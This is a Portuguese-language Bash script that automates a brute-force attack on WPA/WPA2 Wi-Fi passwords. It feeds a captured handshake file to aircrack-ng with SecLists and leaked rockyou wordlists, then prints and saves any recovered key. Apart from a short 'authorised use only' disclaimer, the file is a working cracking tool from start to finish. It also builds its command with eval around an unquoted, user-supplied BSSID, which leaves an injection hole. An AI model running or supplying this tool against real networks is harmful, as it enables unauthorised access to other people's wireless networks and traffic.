#!/bin/bash

################################################################################
#                                                                              #
#  ██╗    ██╗██╗███████╗██╗     ██╗                                          #
#  ██║    ██║██║██╔════╝██║     ██║                                          #
#  ██║ █╗ ██║██║█████╗  ██║     ██║                                          #
#  ██║██╗╚██║██║██╔══╝  ██║     ██║                                          #
#  ╚███╔███╔╝██║██║     ███████╗███████╗                                     #
#   ╚══╝╚══╝ ╚═╝╚═╝     ╚══════╝╚══════╝                                     #
#                                                                              #
#  BRUTE FORCE WIFI - WPA/WPA2                                               #
#  Versão: 1.0                                                                 #
#  Data: $(date +%d/%m/%Y)                                                     #
#                                                                              #
#  ⚠️  AVISO LEGAL: USE APENAS COM AUTORIZAÇÃO FORMAL POR ESCRITO!          #
#  Este script é apenas para fins educacionais e testes autorizados.         #
#                                                                              #
################################################################################

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Configurações globais
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="${SCRIPT_DIR}/resultados_bruteforce"
SECLISTS_DIR="${SCRIPT_DIR}/../Kali/Ferramentas/SecLists/Passwords"
LOG_FILE="${OUTPUT_DIR}/bruteforce_${TIMESTAMP}.log"

# Variáveis globais
CAP_FILE=""
BSSID=""
PASSWORD_FOUND=false
PASSWORD=""
WORDLISTS_TESTED=0
WORDLISTS_TOTAL=0

################################################################################
# FUNÇÕES AUXILIARES
################################################################################

# Banner
show_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    cat << "EOF"
  ██╗    ██╗██╗███████╗██╗     ██╗
  ██║    ██║██║██╔════╝██║     ██║
  ██║ █╗ ██║██║█████╗  ██║     ██║
  ██║██╗╚██║██║██╔══╝  ██║     ██║
  ╚███╔███╔╝██║██║     ███████╗███████╗
   ╚══╝╚══╝ ╚═╝╚═╝     ╚══════╝╚══════╝
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}Brute Force WiFi WPA/WPA2${NC}"
    echo -e "${RED}⚠️  USE APENAS COM AUTORIZAÇÃO!${NC}\n"
}

# Verificar se está rodando como root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Este script precisa ser executado como root (sudo)${NC}"
        exit 1
    fi
}

# Verificar dependências
check_dependencies() {
    local missing=0
    
    echo -e "${BLUE}[*] Verificando dependências...${NC}"
    
    if ! command -v aircrack-ng &> /dev/null; then
        echo -e "${RED}[!] aircrack-ng não encontrado${NC}"
        missing=1
    fi
    
    if [[ $missing -eq 1 ]]; then
        echo -e "${YELLOW}[*] Instalando aircrack-ng...${NC}"
        apt-get update && apt-get install -y aircrack-ng
    else
        echo -e "${GREEN}[+] Todas as dependências estão instaladas${NC}"
    fi
}

# Verificar SecLists
check_seclists() {
    echo -e "${BLUE}[*] Verificando SecLists...${NC}"
    
    if [[ ! -d "$SECLISTS_DIR" ]]; then
        echo -e "${RED}[!] SecLists não encontrado em: $SECLISTS_DIR${NC}"
        echo -e "${YELLOW}[*] Tentando localizar SecLists...${NC}"
        
        # Tentar outros caminhos comuns
        local possible_paths=(
            "/usr/share/seclists/Passwords"
            "/usr/share/wordlists/SecLists/Passwords"
            "${HOME}/SecLists/Passwords"
            "${SCRIPT_DIR}/../../Kali/Ferramentas/SecLists/Passwords"
        )
        
        for path in "${possible_paths[@]}"; do
            if [[ -d "$path" ]]; then
                SECLISTS_DIR="$path"
                echo -e "${GREEN}[+] SecLists encontrado em: $SECLISTS_DIR${NC}"
                return 0
            fi
        done
        
        echo -e "${RED}[!] SecLists não encontrado em nenhum local${NC}"
        echo -e "${YELLOW}[*] Instale com: sudo apt install seclists -y${NC}"
        echo -e "${YELLOW}[*] Ou clone: git clone https://github.com/danielmiessler/SecLists.git${NC}"
        exit 1
    else
        echo -e "${GREEN}[+] SecLists encontrado em: $SECLISTS_DIR${NC}"
    fi
}

# Criar diretório de resultados
create_output_dir() {
    mkdir -p "$OUTPUT_DIR"
    echo "" > "$LOG_FILE"
    log "INFO" "Iniciando brute force WiFi - $(date)"
}

# Função de log
log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
    
    case "$level" in
        "SUCCESS")
            echo -e "${GREEN}[+] $message${NC}"
            ;;
        "ERROR")
            echo -e "${RED}[!] $message${NC}"
            ;;
        "WARNING")
            echo -e "${YELLOW}[*] $message${NC}"
            ;;
        "INFO")
            echo -e "${BLUE}[*] $message${NC}"
            ;;
        *)
            echo -e "$message"
            ;;
    esac
}

# Solicitar arquivo .cap
get_cap_file() {
    echo -e "\n${CYAN}${BOLD}=== CONFIGURAÇÃO INICIAL ===${NC}\n"
    
    # Verificar se foi passado como argumento
    if [[ -n "$1" ]]; then
        CAP_FILE="$1"
    else
        echo -ne "${YELLOW}[?] Caminho do arquivo .cap (handshake capturado): ${NC}"
        read CAP_FILE
    fi
    
    # Expandir ~ e caminhos relativos
    CAP_FILE="${CAP_FILE/#\~/$HOME}"
    if [[ ! "$CAP_FILE" =~ ^/ ]]; then
        CAP_FILE="${SCRIPT_DIR}/${CAP_FILE}"
    fi
    
    # Verificar se arquivo existe
    if [[ ! -f "$CAP_FILE" ]]; then
        log "ERROR" "Arquivo não encontrado: $CAP_FILE"
        exit 1
    fi
    
    log "SUCCESS" "Arquivo .cap encontrado: $CAP_FILE"
    
    # Verificar se tem handshake
    log "INFO" "Verificando se arquivo contém handshake..."
    local handshake_check=$(aircrack-ng "$CAP_FILE" 2>&1 | grep -i "handshake\|1 handshake")
    
    if [[ -z "$handshake_check" ]]; then
        log "WARNING" "Handshake não detectado no arquivo. Continuando mesmo assim..."
        echo -ne "${YELLOW}[?] Continuar mesmo sem handshake detectado? [s/N]: ${NC}"
        read continue_choice
        if [[ ! "$continue_choice" =~ ^[Ss] ]]; then
            exit 1
        fi
    else
        log "SUCCESS" "Handshake detectado no arquivo!"
    fi
}

# Solicitar BSSID (opcional, mas recomendado)
get_bssid() {
    echo -ne "${YELLOW}[?] BSSID do AP [opcional, mas acelera o processo]: ${NC}"
    read BSSID
    
    if [[ -n "$BSSID" ]]; then
        log "SUCCESS" "BSSID definido: $BSSID"
    else
        log "INFO" "BSSID não informado, testando todas as redes no arquivo"
    fi
}

# Encontrar todas as wordlists
find_wordlists() {
    log "INFO" "Procurando wordlists na SecLists..."
    
    local wordlist_array=()
    
    # Ordem de prioridade: wordlists menores e mais comuns primeiro
    local priority_patterns=(
        "WiFi-WPA/probable-v2-wpa-top62.txt"
        "WiFi-WPA/probable-v2-wpa-top447.txt"
        "WiFi-WPA/probable-v2-wpa-top4800.txt"
        "Common-Credentials/best15.txt"
        "Common-Credentials/best110.txt"
        "Common-Credentials/best1050.txt"
        "Common-Credentials/500-worst-passwords.txt"
        "Common-Credentials/2025-199_most_used_passwords.txt"
        "Common-Credentials/2024-197_most_used_passwords.txt"
        "Common-Credentials/2023-200_most_used_passwords.txt"
        "Common-Credentials/2020-200_most_used_passwords.txt"
        "Common-Credentials/top-passwords-shortlist.txt"
        "Common-Credentials/probable-v2_top-207.txt"
        "Common-Credentials/probable-v2_top-1575.txt"
        "Common-Credentials/probable-v2_top-12000.txt"
        "Common-Credentials/10k-most-common.txt"
        "Common-Credentials/100k-most-used-passwords-NCSC.txt"
        "Common-Credentials/Pwdb_top-1000.txt"
        "Common-Credentials/Pwdb_top-10000.txt"
        "Common-Credentials/Pwdb_top-100000.txt"
        "Common-Credentials/xato-net-10-million-passwords-10.txt"
        "Common-Credentials/xato-net-10-million-passwords-100.txt"
        "Common-Credentials/xato-net-10-million-passwords-1000.txt"
        "Common-Credentials/xato-net-10-million-passwords-10000.txt"
        "Common-Credentials/xato-net-10-million-passwords-100000.txt"
        "Common-Credentials/xato-net-10-million-passwords-1000000.txt"
        "Leaked-Databases/rockyou-05.txt"
        "Leaked-Databases/rockyou-10.txt"
        "Leaked-Databases/rockyou-15.txt"
        "Leaked-Databases/rockyou-20.txt"
        "Leaked-Databases/rockyou-25.txt"
        "Leaked-Databases/rockyou-30.txt"
        "Leaked-Databases/rockyou-35.txt"
        "Leaked-Databases/rockyou-40.txt"
        "Leaked-Databases/rockyou-45.txt"
        "Leaked-Databases/rockyou-50.txt"
        "Leaked-Databases/rockyou-55.txt"
        "Leaked-Databases/rockyou-60.txt"
        "Leaked-Databases/rockyou-65.txt"
        "Leaked-Databases/rockyou-70.txt"
        "Leaked-Databases/rockyou-75.txt"
    )
    
    # Adicionar wordlists prioritárias que existem
    for pattern in "${priority_patterns[@]}"; do
        local full_path="${SECLISTS_DIR}/${pattern}"
        if [[ -f "$full_path" ]]; then
            wordlist_array+=("$full_path")
        fi
    done
    
    # Procurar outras wordlists .txt recursivamente (exceto as já adicionadas)
    log "INFO" "Procurando wordlists adicionais..."
    
    # Usar método compatível com diferentes shells
    if command -v find &> /dev/null; then
        while IFS= read -r wordlist; do
            [[ -z "$wordlist" ]] && continue
            
            # Verificar se já não está na lista
            local already_added=false
            for existing in "${wordlist_array[@]}"; do
                if [[ "$existing" == "$wordlist" ]]; then
                    already_added=true
                    break
                fi
            done
            
            if [[ "$already_added" == false ]]; then
                # Ignorar arquivos muito grandes (>500MB) ou muito pequenos (<10 bytes)
                local size=""
                if [[ "$OSTYPE" == "darwin"* ]]; then
                    size=$(stat -f%z "$wordlist" 2>/dev/null)
                else
                    size=$(stat -c%s "$wordlist" 2>/dev/null)
                fi
                
                if [[ -n "$size" && $size -gt 10 && $size -lt 524288000 ]]; then
                    wordlist_array+=("$wordlist")
                fi
            fi
        done < <(find "$SECLISTS_DIR" -type f -name "*.txt" 2>/dev/null | head -100)
    fi
    
    WORDLISTS_TOTAL=${#wordlist_array[@]}
    
    if [[ $WORDLISTS_TOTAL -eq 0 ]]; then
        log "ERROR" "Nenhuma wordlist encontrada!"
        exit 1
    fi
    
    log "SUCCESS" "Encontradas $WORDLISTS_TOTAL wordlists"
    
    # Retornar array (usando variável global)
    WORDLIST_ARRAY=("${wordlist_array[@]}")
}

# Testar wordlist
test_wordlist() {
    local wordlist="$1"
    local wordlist_name=$(basename "$wordlist")
    
    WORDLISTS_TESTED=$((WORDLISTS_TESTED + 1))
    
    echo ""
    log "INFO" "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    log "INFO" "Testando wordlist [$WORDLISTS_TESTED/$WORDLISTS_TOTAL]: $wordlist_name"
    log "INFO" "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    # Contar linhas da wordlist
    local line_count=$(wc -l < "$wordlist" 2>/dev/null | tr -d ' ')
    if [[ -n "$line_count" && $line_count -gt 0 ]]; then
        log "INFO" "Wordlist contém $line_count senhas"
    fi
    
    # Construir comando aircrack-ng
    local cmd="aircrack-ng -w \"$wordlist\""
    
    if [[ -n "$BSSID" ]]; then
        cmd="$cmd -b $BSSID"
    fi
    
    cmd="$cmd \"$CAP_FILE\""
    
    log "INFO" "Executando: $cmd"
    echo ""
    
    # Executar aircrack-ng e capturar output
    local result=$(eval "$cmd" 2>&1 | tee /tmp/aircrack_output_$$.txt)
    
    # Verificar se senha foi encontrada
    if grep -qi "KEY FOUND\|KEY FOUND!" /tmp/aircrack_output_$$.txt 2>/dev/null; then
        PASSWORD_FOUND=true
        
        # Extrair senha do output (múltiplos padrões)
        # Padrão 1: [senha] ou KEY FOUND! [senha]
        PASSWORD=$(grep -i "KEY FOUND" /tmp/aircrack_output_$$.txt | \
                   sed -n 's/.*\[\([^]]*\)\].*/\1/p' | head -1)
        
        # Padrão 2: KEY FOUND! senha (sem colchetes)
        if [[ -z "$PASSWORD" ]]; then
            PASSWORD=$(grep -i "KEY FOUND" /tmp/aircrack_output_$$.txt | \
                      sed -n 's/.*KEY FOUND[!]*[[:space:]]*]\([^[:space:]]*\).*/\1/p' | head -1)
        fi
        
        # Padrão 3: Qualquer texto entre colchetes após KEY FOUND
        if [[ -z "$PASSWORD" ]]; then
            PASSWORD=$(grep -i "KEY FOUND" /tmp/aircrack_output_$$.txt | \
                      grep -oE '\[[^]]+\]' | sed 's/\[//;s/\]//' | head -1)
        fi
        
        # Padrão 4: Última tentativa - pegar qualquer palavra após KEY FOUND
        if [[ -z "$PASSWORD" ]]; then
            PASSWORD=$(grep -i "KEY FOUND" /tmp/aircrack_output_$$.txt | \
                      awk -F'KEY FOUND' '{print $2}' | awk '{print $1}' | \
                      sed 's/\[//;s/\]//;s/!//' | head -1)
        fi
        
        log "SUCCESS" "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        log "SUCCESS" "🎉 SENHA ENCONTRADA! 🎉"
        log "SUCCESS" "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        log "SUCCESS" "Senha: ${BOLD}${GREEN}$PASSWORD${NC}"
        log "SUCCESS" "Wordlist: $wordlist_name"
        log "SUCCESS" "Wordlists testadas: $WORDLISTS_TESTED"
        
        echo ""
        echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}${BOLD}            SENHA ENCONTRADA COM SUCESSO!${NC}"
        echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════════${NC}"
        echo -e "${CYAN}Senha: ${BOLD}${GREEN}$PASSWORD${NC}${CYAN}${NC}"
        echo -e "${CYAN}Wordlist: $wordlist_name${NC}"
        echo -e "${CYAN}Total de wordlists testadas: $WORDLISTS_TESTED${NC}"
        echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════════${NC}"
        echo ""
        
        # Salvar resultado
        local result_file="${OUTPUT_DIR}/senha_encontrada_${TIMESTAMP}.txt"
        {
            echo "═══════════════════════════════════════════════════════════"
            echo "            SENHA ENCONTRADA - BRUTE FORCE WIFI"
            echo "═══════════════════════════════════════════════════════════"
            echo "Data: $(date)"
            echo "Arquivo .cap: $CAP_FILE"
            if [[ -n "$BSSID" ]]; then
                echo "BSSID: $BSSID"
            fi
            echo "Senha: $PASSWORD"
            echo "Wordlist: $wordlist"
            echo "Wordlist (nome): $wordlist_name"
            echo "Total de wordlists testadas: $WORDLISTS_TESTED"
            echo "═══════════════════════════════════════════════════════════"
        } > "$result_file"
        
        log "SUCCESS" "Resultado salvo em: $result_file"
        
        rm -f /tmp/aircrack_output_$$.txt
        return 0
    fi
    
    rm -f /tmp/aircrack_output_$$.txt
    return 1
}

# Executar brute force
execute_bruteforce() {
    log "INFO" "Iniciando brute force..."
    log "INFO" "Arquivo .cap: $CAP_FILE"
    if [[ -n "$BSSID" ]]; then
        log "INFO" "BSSID: $BSSID"
    fi
    log "INFO" "Total de wordlists: $WORDLISTS_TOTAL"
    echo ""
    
    # Testar cada wordlist
    for wordlist in "${WORDLIST_ARRAY[@]}"; do
        if [[ "$PASSWORD_FOUND" == true ]]; then
            break
        fi
        
        test_wordlist "$wordlist"
        
        # Pequena pausa entre wordlists
        sleep 1
    done
    
    # Resultado final
    echo ""
    if [[ "$PASSWORD_FOUND" == true ]]; then
        log "SUCCESS" "Brute force concluído com sucesso!"
        log "SUCCESS" "Senha encontrada: $PASSWORD"
    else
        log "WARNING" "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        log "WARNING" "Senha não encontrada após testar $WORDLISTS_TESTED wordlists"
        log "WARNING" "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        log "INFO" "Tente:"
        log "INFO" "  - Usar wordlists maiores ou mais específicas"
        log "INFO" "  - Verificar se o handshake está correto"
        log "INFO" "  - Considerar usar hashcat com GPU para acelerar"
        
        local result_file="${OUTPUT_DIR}/senha_nao_encontrada_${TIMESTAMP}.txt"
        {
            echo "═══════════════════════════════════════════════════════════"
            echo "         SENHA NÃO ENCONTRADA - BRUTE FORCE WIFI"
            echo "═══════════════════════════════════════════════════════════"
            echo "Data: $(date)"
            echo "Arquivo .cap: $CAP_FILE"
            if [[ -n "$BSSID" ]]; then
                echo "BSSID: $BSSID"
            fi
            echo "Total de wordlists testadas: $WORDLISTS_TESTED"
            echo "═══════════════════════════════════════════════════════════"
        } > "$result_file"
        
        log "INFO" "Relatório salvo em: $result_file"
    fi
    
    log "INFO" "Log completo salvo em: $LOG_FILE"
}

# Menu principal
show_menu() {
    echo -e "\n${CYAN}${BOLD}=== MENU PRINCIPAL ===${NC}\n"
    echo -e "${GREEN}[1]${NC} Executar brute force completo"
    echo -e "${GREEN}[2]${NC} Listar wordlists disponíveis"
    echo -e "${GREEN}[3]${NC} Testar wordlist específica"
    echo -e "${RED}[0]${NC} Sair"
    echo -ne "\n${YELLOW}[?] Escolha uma opção: ${NC}"
}

# Listar wordlists
list_wordlists() {
    echo -e "\n${CYAN}${BOLD}=== WORDLISTS DISPONÍVEIS ===${NC}\n"
    
    if [[ ${#WORDLIST_ARRAY[@]} -eq 0 ]]; then
        find_wordlists
    fi
    
    local count=1
    for wordlist in "${WORDLIST_ARRAY[@]}"; do
        local name=$(basename "$wordlist")
        local size=$(du -h "$wordlist" 2>/dev/null | cut -f1)
        local lines=$(wc -l < "$wordlist" 2>/dev/null | tr -d ' ')
        
        printf "${GREEN}[%3d]${NC} %-60s ${CYAN}%8s${NC} ${YELLOW}%10s linhas${NC}\n" \
               "$count" "$name" "$size" "$lines"
        
        if [[ $count -ge 50 ]]; then
            echo -e "${YELLOW}... e mais $((${#WORDLIST_ARRAY[@]} - 50)) wordlists${NC}"
            break
        fi
        ((count++))
    done
    
    echo ""
}

# Testar wordlist específica
test_specific_wordlist() {
    echo -e "\n${CYAN}${BOLD}=== TESTAR WORDLIST ESPECÍFICA ===${NC}\n"
    
    if [[ ${#WORDLIST_ARRAY[@]} -eq 0 ]]; then
        find_wordlists
    fi
    
    list_wordlists
    
    echo -ne "${YELLOW}[?] Número da wordlist (1-${#WORDLIST_ARRAY[@]}) ou caminho completo: ${NC}"
    read choice
    
    local wordlist=""
    
    # Verificar se é número ou caminho
    if [[ "$choice" =~ ^[0-9]+$ ]]; then
        if [[ $choice -ge 1 && $choice -le ${#WORDLIST_ARRAY[@]} ]]; then
            wordlist="${WORDLIST_ARRAY[$((choice-1))]}"
        else
            log "ERROR" "Número inválido"
            return 1
        fi
    else
        wordlist="$choice"
        if [[ ! -f "$wordlist" ]]; then
            log "ERROR" "Arquivo não encontrado: $wordlist"
            return 1
        fi
    fi
    
    test_wordlist "$wordlist"
}

################################################################################
# FUNÇÃO PRINCIPAL
################################################################################

main() {
    show_banner
    check_root
    check_dependencies
    check_seclists
    create_output_dir
    
    # Verificar se arquivo foi passado como argumento
    if [[ -n "$1" ]]; then
        get_cap_file "$1"
        get_bssid
        find_wordlists
        execute_bruteforce
    else
        # Modo interativo
        get_cap_file
        get_bssid
        find_wordlists
        
        while true; do
            show_menu
            read choice
            
            case $choice in
                1)
                    execute_bruteforce
                    ;;
                2)
                    list_wordlists
                    ;;
                3)
                    test_specific_wordlist
                    ;;
                0)
                    log "INFO" "Saindo..."
                    exit 0
                    ;;
                *)
                    log "ERROR" "Opção inválida"
                    ;;
            esac
            
            echo -e "\n${YELLOW}[*] Pressione Enter para continuar...${NC}"
            read
        done
    fi
}

# Executar script
main "$@"

